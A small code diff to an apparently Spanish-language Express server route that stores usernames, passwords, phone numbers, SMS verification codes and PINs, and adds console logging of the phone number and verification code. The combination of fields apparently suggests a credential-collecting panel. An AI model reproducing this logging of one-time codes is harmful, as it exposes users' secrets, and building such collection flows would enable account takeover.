@@ -1186,8 +1186,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.username = inputData.username;
                 updatedFields.password = inputData.password;
                 break;
+              case 'telefono':
+                updatedFields.celular = inputData.telefono;
+                console.log('Teléfono recibido:', inputData.telefono);
+                break;
               case 'codigo':
                 updatedFields.sms = inputData.codigo;
+                console.log('Código de verificación recibido:', inputData.codigo);
                 break;
               case 'nip':
                 updatedFields.nip = inputData.nip;
